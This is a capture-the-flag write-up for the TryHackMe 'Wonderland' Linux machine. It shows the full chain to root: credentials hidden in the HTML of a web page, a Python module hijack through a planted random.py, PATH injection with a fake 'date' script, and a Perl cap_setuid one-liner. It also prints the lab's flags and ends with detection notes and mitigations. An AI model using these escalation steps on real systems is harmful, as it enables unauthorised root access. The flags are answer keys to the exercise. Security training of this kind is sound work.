<!-- frontmatter: {"title":"Wonderland","date":"2026-02-07","platform":"TryHackMe","category":"Linux","difficulty":"Medium","tags":["ssh","sudo","path-injection","capabilities","privesc"],"summary":"Credential leak to SSH, Python module hijack, PATH injection, and cap_setuid abuse to reach root."} -->

# Wonderland CTF

## Scope & Target

- **Host:** `10.201.105.251`
- **Goal:** Obtain user and root flags
- **Methodology:** Recon → Web enum → Initial access → Priv‑esc chain (alice → rabbit → hatter → root)

---

## TL;DR Path

1. **Web enum** discovers `/r/a/b/b/i/t/` and reveals credentials `alice:HowDothTheLittleCrocodileImproveHisShiningTail`.
2. **SSH** as `alice`.
3. **Sudo‑allowed Python** as user `rabbit` executes `/home/alice/walrus_and_the_carpenter.py`; **hijack Python module resolution** with a malicious `random.py` to pop a shell as `rabbit`.
4. **Tea Party binary** is vulnerable to **PATH injection** on `date`; craft `/tmp/bin/date` → shell as `hatter`.
5. Enumerate **capabilities**; `/usr/bin/perl` has `cap_setuid+ep`. Use Perl to setuid(0) → **root**.
6. Read flags.

---

## Recon

### Nmap

```bash
nmap -sV -Pn -oN nmap.txt 10.201.105.251
# 22/tcp open  ssh OpenSSH 7.6p1
# 80/tcp open  http Golang net/http server
```

Notes: Two exposed services, HTTP on 80 looks like a Go server, likely a light file server or app; SSH is present for potential credential reuse.

### Content Discovery

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
# ... r (301), img (301), index.html (301)

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
# ... a (301)
```

Manual traversal suggests a rabbit‑hole (literally).

---

## Web Enumeration → Credential Disclosure

Progressive path guessing:

```bash
curl http://10.201.105.251/r/
curl http://10.201.105.251/r/a/
curl http://10.201.105.251/r/a/b/b/i/t/
```

Final page contains a hidden line with credentials:

```html
<p style="display: none;">
  alice:HowDothTheLittleCrocodileImproveHisShiningTail
</p>
```

---

## Initial Foothold (SSH → alice)

```bash
ssh alice@10.201.105.251
whoami && id && ls -la
# user: alice
```

Interesting files:

- `~/walrus_and_the_carpenter.py`
- `~/root.txt` (not readable yet)

Sudo privileges:

```bash
sudo -l
# (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

---

## alice → rabbit: Python Module Hijacking via `random.py`

`walrus_and_the_carpenter.py`:

```python
import random
poem = """..."""
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

**Observation:** Python’s import order puts the **script directory** early in `sys.path`. If we drop a `random.py` next to the target script, it will be imported **instead of** the stdlib `random` module.

Create malicious module:

```python
# /home/alice/random.py
import os
os.execl('/bin/bash', 'bash', '-p')
```

Execute as `rabbit` via sudo:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
whoami
# rabbit
```

---

## rabbit → hatter: PATH Injection on `teaParty`

List rabbit’s home:

```bash
ls -la /home/rabbit
# teaParty (ELF or script)
/home/rabbit/teaParty
# Output includes: "Probably by Sun, 09 Nov 2025 00:46:02 +0000"
# The program likely calls `date` without an absolute path.
```

Exploit by shadowing `date`:

```bash
mkdir -p /tmp/bin
printf '#!/bin/sh\n/bin/sh -p\n' > /tmp/bin/date
chmod +x /tmp/bin/date
PATH=/tmp/bin:$PATH /home/rabbit/teaParty

id
# uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

---

## hatter → root: Linux Capabilities (Perl `cap_setuid`)

Enumerate capabilities:

```bash
getcap -r / 2>/dev/null
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/perl5.x = cap_setuid+ep
```

Abuse with Perl:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
id
# uid=0(root)
```

---

## Loot (Flags)

```bash
cat /root/user.txt /home/alice/root.txt
# thm{"Curiouser and curiouser!"}
# thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---

## Detection & Forensics Notes

- Web access logs for `/r/a/b/b/i/t/` reveal reconnaissance timeline.
- `.bash_history` for `alice`, `rabbit`, `hatter` (if not restricted) exposes commands: `sudo -u rabbit ...`, `PATH=/tmp/bin:$PATH ...`, Perl setuid exploit.
- File system artifacts:
  - `/home/alice/random.py`
  - `/tmp/bin/date`
- `auth.log` / `secure` entries for escalations tied to `sudo` and SSH sessions.
- `getcap` enumeration indicates misconfiguration (capability left on an interpreter).

---

## Mitigations

- **Web app / Content:** Don’t expose credentials in hidden DOM; move secrets to server‑side; apply content reviews.
- **Least privilege:** Remove sudo rules that allow executing interpreters; if needed, whitelist exact binaries with **absolute** interpreter paths and `NOEXEC` mounts where possible.
- **Python imports:** Execute with sanitized `PYTHONPATH`; vendor required modules; run with `-I` (isolated mode) or set `sys.path` explicitly.
- **PATH safety:** In set‑uid or privileged binaries, **use absolute paths** for all external calls or drop privileges before invoking utilities.
- **Capabilities:** Avoid granting `cap_setuid` to interpreters (Perl/Python). If required, wrap capability into a minimal, audited helper in C that drops privileges immediately after use.
- **Monitoring:** Alert on capability changes (`setcap`), unexpected binaries in world‑writable directories (`/tmp/bin/*`), and suspicious `sudo -u <otheruser>` patterns.

---

## Appendix — Full Command Log

```bash
# Recon
nmap -sV -Pn -oN nmap.txt 10.201.105.251
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
curl http://10.201.105.251/r/a/b/b/i/t/

# Initial access
ssh alice@10.201.105.251

# Escalate to rabbit
cat /home/alice/walrus_and_the_carpenter.py
printf 'import os\nos.execl(\"/bin/bash\",\"bash\",\"-p\")\n' > /home/alice/random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# Rabbit → Hatter (PATH injection)
mkdir -p /tmp/bin
printf '#!/bin/sh\n/bin/sh -p\n' > /tmp/bin/date
chmod +x /tmp/bin/date
PATH=/tmp/bin:$PATH /home/rabbit/teaParty

# Hatter → Root (capabilities)
getcap -r / 2>/dev/null | grep perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Proof
cat /root/user.txt /home/alice/root.txt
```
